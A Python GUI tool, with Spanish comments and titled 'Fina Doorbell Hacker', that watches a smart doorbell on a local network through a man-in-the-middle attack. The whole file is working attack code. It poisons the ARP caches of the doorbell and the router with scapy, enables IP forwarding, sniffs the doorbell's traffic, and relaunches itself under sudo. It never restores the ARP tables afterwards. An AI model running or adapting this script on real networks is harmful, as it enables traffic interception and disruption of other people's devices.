#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, font
import threading
import time
import subprocess
import os
import sys
from scapy.all import *

# Configuración
TARGET_IP = "192.168.0.5" # TIMBRE
GATEWAY_IP = "192.168.0.1" # ROUTER
INTERFACE = "enp1s0" 

class DoorbellHackerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("🕵️ Fina Doorbell Hacker")
        self.root.geometry("400x600")
        self.root.configure(bg="#1e1e1e")
        
        # Estilos
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # UI Header
        self.header = tk.Label(root, text="MODO VIGILANCIA", bg="#1e1e1e", fg="#00ff00", font=("Courier", 18, "bold"))
        self.header.pack(pady=20)
        
        # Status Ball
        self.canvas = tk.Canvas(root, width=100, height=100, bg="#1e1e1e", highlightthickness=0)
        self.status_light = self.canvas.create_oval(25, 25, 75, 75, fill="gray")
        self.canvas.pack(pady=10)
        
        self.log_text = tk.Text(root, height=10, bg="black", fg="#00ff00", font=("Courier", 10))
        self.log_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
        
        # Botones Control
        btn_frame = tk.Frame(root, bg="#1e1e1e")
        btn_frame.pack(pady=10, fill=tk.X)
        
        self.btn_ver = tk.Button(btn_frame, text="👁️ VER CÁMARA", command=self.ver_camara, bg="#333", fg="white", font=("Arial", 10, "bold"))
        self.btn_ver.pack(side=tk.LEFT, padx=10, expand=True, fill=tk.X)
        
        self.btn_cortar = tk.Button(btn_frame, text="📞 CORTAR", command=self.cortar, bg="#880000", fg="white", font=("Arial", 10, "bold"))
        self.btn_cortar.pack(side=tk.RIGHT, padx=10, expand=True, fill=tk.X)

        # Variables de estado
        self.packet_count = 0
        self.target_mac = None
        self.gateway_mac = None
        self.monitoring = True
        
        self.log("🚀 Iniciando Sistema...")
        
        # Iniciar Hilos
        threading.Thread(target=self.start_mitm, daemon=True).start()

    def log(self, text):
        self.log_text.insert(tk.END, f"> {text}\n")
        self.log_text.see(tk.END)

    def set_status(self, state):
        color = "gray"
        if state == "idle": color = "green"
        if state == "alert": color = "red"
        self.canvas.itemconfig(self.status_light, fill=color)

    # --- Lógica MITM ---
    def get_mac(self, ip):
        conf.verb = 0
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False, iface=INTERFACE)
        if ans: return ans[0][1].src
        return None

    def spoof(self):
        conf.verb = 0
        if not self.target_mac or not self.gateway_mac: return
        # Poisoning
        sendp(Ether(dst=self.target_mac)/ARP(op=2, pdst=TARGET_IP, hwdst=self.target_mac, psrc=GATEWAY_IP), verbose=False, iface=INTERFACE)
        sendp(Ether(dst=self.gateway_mac)/ARP(op=2, pdst=GATEWAY_IP, hwdst=self.gateway_mac, psrc=TARGET_IP), verbose=False, iface=INTERFACE)

    def packet_callback(self, packet):
        if IP in packet and packet[IP].src == TARGET_IP:
            self.packet_count += 1
            if self.packet_count % 5 == 0: # Sensitivity throttle
                self.root.after(0, lambda: self.trigger_alert(len(packet)))

    def start_mitm(self):
        # 1. Enable Forwarding
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        self.log("✅ IP Forward activo.")
        
        # 2. Find MACs
        self.log("🔍 Buscando Timbre...")
        while not self.target_mac:
            self.target_mac = self.get_mac(TARGET_IP)
            if not self.target_mac:
                self.root.after(0, lambda: self.set_status("gray"))
                time.sleep(1)
        
        self.log(f"🎯 Target Found: {self.target_mac}")
        self.gateway_mac = self.get_mac(GATEWAY_IP)
        self.root.after(0, lambda: self.set_status("idle"))
        
        # 3. Loop Attack
        self.log("⚡ VIGILANCIA ACTIVA")
        self.last_packet_time = 0
        
        while self.monitoring:
            self.spoof()
            sniff(filter=f"host {TARGET_IP}", prn=self.packet_callback, timeout=0.5, store=0, iface=INTERFACE)

    def trigger_alert(self, size):
        now = time.time()
        if now - self.last_packet_time > 2: # Debounce log
             self.log(f"🚨 ACTIVIDAD DETECTADA! ({size} bytes)")
             self.set_status("alert")
             # Auto-Reset visual
             self.root.after(2000, lambda: self.set_status("idle"))
        self.last_packet_time = now

    # --- Acciones ---
    def ver_camara(self):
        self.log("📺 Abriendo Video (Waydroid)...")
        # Aquí llamamos a la lógica existente de Fina
        subprocess.Popen(["python3", "plugins/doorbell/monitor.py", "--trigger"])

    def cortar(self):
         self.log("📴 Cortando llamada...")
         subprocess.Popen(["python3", "plugins/doorbell/hangup_doorbell.py"])

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("⚠️ NECESITO ROOT. Relanzando...")
        os.execvp("sudo", ["sudo", "python3"] + sys.argv)
    
    root = tk.Tk()
    app = DoorbellHackerApp(root)
    root.mainloop()
